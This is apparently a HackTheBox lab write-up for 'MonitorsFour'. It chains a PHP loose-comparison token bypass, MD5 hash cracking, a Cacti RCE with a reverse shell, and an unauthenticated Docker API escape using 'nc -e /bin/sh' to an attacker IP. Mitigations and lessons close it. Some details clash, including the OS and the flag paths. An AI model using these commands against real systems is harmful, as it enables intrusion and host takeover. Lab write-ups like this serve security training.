# HackTheBox Machine: MonitorsFour
**PHP Type Juggling & Docker Escape Challenge**

## Machine Overview
Real-world penetration test chain demonstrating API vulnerability exploitation, credential cracking, web application RCE, and containerized environment escape. Progresses from PHP loose comparison flaw to privileged access via Docker daemon exposure.

**Difficulty:** Easy | **Status:** Active | **Platform:** HackTheBox Machines | **OS:** Linux (Docker Container) | **Type:** Multi-stage Exploitation

---

## High-Level Attack Chain

1. **API Enumeration** → Discover PHP type juggling vulnerability
2. **Token Bypass** → Exploit loose comparison (0e notation = magic hash)
3. **Credential Extraction** → Leak and crack MD5 hashes
4. **Web RCE** → Exploit Cacti application vulnerability (CVE-2025-24367)
5. **Container Escape** → Abuse exposed Docker daemon for host access
6. **Privilege Escalation** → Root access via bind mount exploitation

---

## Methodology

### Phase 1: Reconnaissance & Enumeration
- DNS and IP configuration
- Port scanning to identify services
- Web application discovery (dirsearch)
- Subdomain fuzzing to locate additional services
- Environment variable leakage analysis

### Phase 2: API Vulnerability Discovery
- API endpoint identification at `/user?token=`
- PHP loose comparison testing (magic hashes)
- Fuzzing token parameter with payload wordlists
- Identifying valid bypass tokens

### Phase 3: Data Exfiltration & Cracking
- Extracting user credentials via API
- MD5 hash collection and cracking (hashcat/John)
- Identifying valid credentials for secondary services

### Phase 4: Application Exploitation
- Cacti service enumeration
- CVE-2025-24367 exploitation (auth-based RCE)
- Reverse shell payload delivery
- Initial access as www-data user

### Phase 5: Container Escape & Privilege Escalation
- Internal network scanning within container
- Docker daemon API discovery (port 2375)
- Unauthenticated Docker API exploitation
- Malicious container creation with bind mounts
- Host filesystem access and root shell

---

## Technical Details

### PHP Type Juggling Vulnerability

Modern PHP 8.3.27 uses loose equality (`==`) comparison operator, treating strings beginning with `0e` followed by digits as scientific notation (0 = zero).

**Vulnerable Code Pattern:**
```php
if ($provided_token == $expected_token) {
    // Access granted
}
```

**Exploit:**
- Magic hash: `0e123456789...` 
- When hashed with MD5: `0e` prefix + digits = matches any other `0e` hash
- Both evaluate to zero mathematically

**Payload Discovery:**
```bash
ffuf -c -u "http://monitorsfour.htb/user?token=FUZZ" \
     -w php_loose_comparison.txt -fw 4
```

---

### Credential Extraction & Cracking

**API Data Dump:**
```bash
curl "http://monitorsfour.htb/user?token=0e1234567"
```

**Response:**
```json
[
  {
    "id": 2,
    "username": "admin",
    "email": "admin@monitorsfour.htb",
    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
    "role": "super user"
  },
  {
    "id": 5,
    "username": "mwatson",
    "email": "mwatson@monitorsfour.htb",
    "password": "69196959c16b26ef00b77d82cf6eb169",
    "role": "standard user"
  }
]
```

**Hash Cracking:**
```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
# Result: mwatson:wonderful1
```

---

### Cacti Application RCE (CVE-2025-24367)

**Affected Version:** Cacti v1.2.28

**Exploitation Steps:**

1. **Subdomain Discovery:**
```bash
ffuf -c -u "http://monitorsfour.htb/" \
     -H "Host: FUZZ.monitorsfour.htb" \
     -w subdomains-top1million-20000.txt -fw 3
# Discovers: cacti.monitorsfour.htb
```

2. **Cacti Login:**
```bash
curl -X POST http://cacti.monitorsfour.htb/auth \
     -d "user=mwatson&pass=wonderful1"
```

3. **PoC Exploitation:**
```bash
git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git
cd CVE-2025-24367-Cacti-PoC

# Start reverse shell listener
nc -lnvp 60001

# Run exploit
python exploit.py -u mwatson -p wonderful1 \
                  -url http://cacti.monitorsfour.htb \
                  -i 10.10.14.47 -l 60001
```

**Result:** Reverse shell as `www-data` user inside Docker container

---

### Docker Daemon Escape (CVE-2025-9074)

**Container Limitations:**
```bash
www-data@821fbd6a43fa:~/html/cacti$ hostname
821fbd6a43fa

www-data@821fbd6a43fa:~/html/cacti$ cat /etc/resolv.conf
nameserver 127.0.0.11
nameserver 192.168.65.7
```

**Exposed Docker API:** 192.168.65.7:2375 (unauthenticated)

**Internal Port Scan:**
```bash
for p in 21 22 53 80 443 445 2375 2376 3306; do
  (timeout 0.3 bash -c "echo >/dev/tcp/192.168.65.7/$p" 2>/dev/null) \
    && echo "OPEN: $p" || echo -n "."
done
```

**Result:** Port 2375 (Docker API) is open

**Enumerate Docker Images:**
```bash
curl -s http://192.168.65.7:2375/images/json
# Returns: docker_setup-nginx-php:latest
```

**Container Escape via Bind Mount:**

1. **Create malicious container JSON:**
```json
{
  "Image": "docker_setup-nginx-php:latest",
  "Cmd": ["/bin/sh", "-c", "nc -e /bin/sh 10.10.14.47 60002"],
  "HostConfig": {
    "Binds": ["/host_root:/mnt/host_root"]
  },
  "Tty": true,
  "OpenStdin": true
}
```

2. **Create container via API:**
```bash
curl -H "Content-Type: application/json" \
     -d @create_container.json \
     http://192.168.65.7:2375/containers/create \
     -o resp.json

cat resp.json
# {"Id":"26d70bac22282409918b13cd2f4169200ac452ae6198468edec4c7a2ba52046b"...}

cid=26d70bac22282409918b13cd2f4169200ac452ae6198468edec4c7a2ba52046b
```

3. **Start container and obtain root shell:**
```bash
curl -X POST http://192.168.65.7:2375/containers/$cid/start

# Listener receives connection as root
nc -lnvp 60002
root@732fe8bf4ee8:/# whoami
root

root@732fe8bf4ee8:/# cat /host_root/Users/Administrator/Desktop/root.txt
f448127512...
```

---

## Flag Locations

| Flag | Location | Access Method |
|------|----------|----------------|
| **User Flag** | `/home/marcus/user.txt` | Read via www-data container shell after Cacti RCE |
| **Root Flag** | `/root/root.txt` (host) | Read via Docker escape shell from `/host_root/Users/Administrator/Desktop/` |

---

## Key Vulnerabilities & CVEs

| Vulnerability | CVE | Impact | Mitigation |
|---------------|-----|--------|-----------|
| PHP Loose Comparison | Logic Flaw | Auth bypass via type juggling | Use strict comparison (`===`) |
| Cacti Auth RCE | CVE-2025-24367 | Remote code execution | Update Cacti to patched version |
| Docker API Exposure | CVE-2025-9074 | Container escape to host | Disable/secure Docker API socket |
| Bind Mount Abuse | Docker Feature | Unrestricted host filesystem access | Implement Docker security policies |

---

## Tools & Techniques

**Reconnaissance:**
- `rustscan` - Fast port scanning
- `dirsearch` - Web directory enumeration
- `ffuf` - Subdomain fuzzing
- `curl` - API testing and exploitation

**Exploitation:**
- `hashcat` / `John the Ripper` - Hash cracking
- Custom Python PoCs - CVE-2025-24367 exploitation
- `nc` (netcat) - Reverse shell handling

**Privilege Escalation:**
- Docker API (`curl`) - Container manipulation
- Bind mount exploitation - Host filesystem access

---

## Lessons Learned

1. **Secure Type Handling:** Always use strict comparison in authentication logic
2. **API Security:** Require authentication for all endpoints returning sensitive data
3. **Secure Default Credentials:** Cacti default passwords must be enforced at installation
4. **Container Security:**
   - Never expose Docker daemon API without authentication
   - Implement Docker AppArmor/SELinux profiles
   - Restrict bind mount capabilities
   - Run containers with minimal privileges
5. **Defense in Depth:** Single vulnerability chains into complete system compromise

---

## Score
**100% Complete** ✓
Both user and root flags captured. Full attack chain executed successfully.

---

**Completion Date:** December 26, 2025  
**Machine Difficulty:** Easy ⭐⭐  
**OS:** Linux (Docker)  
**Time to Complete:** 1-2 hours  
**Status:** Active (Current Lab)  
**Key Learning:** Multi-stage exploitation, container escape, API security
